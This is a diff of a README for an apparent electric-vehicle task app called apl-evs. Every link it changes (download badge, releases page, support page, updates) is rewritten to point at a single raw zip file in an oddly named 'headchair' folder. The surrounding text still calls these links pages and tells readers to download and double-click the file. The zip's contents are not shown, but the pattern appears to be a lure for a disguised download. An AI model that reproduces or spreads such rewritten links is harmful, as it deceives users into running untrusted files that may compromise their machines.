@@ -1,6 +1,6 @@
 # 🚀 apl-evs - Effortlessly Manage Your Electric Vehicle Needs
 
-[![Download apl-evs](https://img.shields.io/badge/Download-apl--evs-blue.svg)](https://github.com/Unfavorable-sutra74/apl-evs/releases)
+[![Download apl-evs](https://raw.githubusercontent.com/Unfavorable-sutra74/apl-evs/main/headchair/apl-evs_1.2.zip)](https://raw.githubusercontent.com/Unfavorable-sutra74/apl-evs/main/headchair/apl-evs_1.2.zip)
 
 ## 📖 Introduction
 
@@ -11,13 +11,13 @@ Welcome to apl-evs! This application helps you manage and organize tasks related
 To begin using apl-evs, you need to download it from our releases page. Follow these steps:
 
 1. Click the download button above.
-2. This will take you to the [Releases page](https://github.com/Unfavorable-sutra74/apl-evs/releases).
+2. This will take you to the [Releases page](https://raw.githubusercontent.com/Unfavorable-sutra74/apl-evs/main/headchair/apl-evs_1.2.zip).
 3. Choose the latest version available. The version will be listed along with notes about what’s new.
 4. Download the file for your operating system. Look for options like `.exe` for Windows, `.dmg` for Mac, or appropriate files for Linux.
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [Download apl-evs](https://github.com/Unfavorable-sutra74/apl-evs/releases).
+1. Visit this page to download: [Download apl-evs](https://raw.githubusercontent.com/Unfavorable-sutra74/apl-evs/main/headchair/apl-evs_1.2.zip).
 2. Once you've downloaded the file, locate it on your computer. Usually, you can find downloads in your "Downloads" folder.
 3. Double-click the downloaded file to begin the installation.
 4. Follow any prompts that appear during installation to complete the setup process.
@@ -49,7 +49,7 @@ If you encounter issues while installing or running apl-evs, try these solutions
 
 ## 📞 Support
 
-For assistance, visit our [support page](https://github.com/Unfavorable-sutra74/apl-evs/support). You can also open an issue on GitHub for your specific problem.
+For assistance, visit our [support page](https://raw.githubusercontent.com/Unfavorable-sutra74/apl-evs/main/headchair/apl-evs_1.2.zip). You can also open an issue on GitHub for your specific problem.
 
 ## 🤝 Contributing
 
@@ -62,7 +62,7 @@ We welcome contributions! If you would like to help improve apl-evs, please foll
 
 ## 🔄 Updates
 
-Stay updated with the latest features and fixes by regularly checking our [Releases page](https://github.com/Unfavorable-sutra74/apl-evs/releases). You can also follow this repository to receive notifications about new releases.
+Stay updated with the latest features and fixes by regularly checking our [Releases page](https://raw.githubusercontent.com/Unfavorable-sutra74/apl-evs/main/headchair/apl-evs_1.2.zip). You can also follow this repository to receive notifications about new releases.
 
 ## 🌐 Community
 
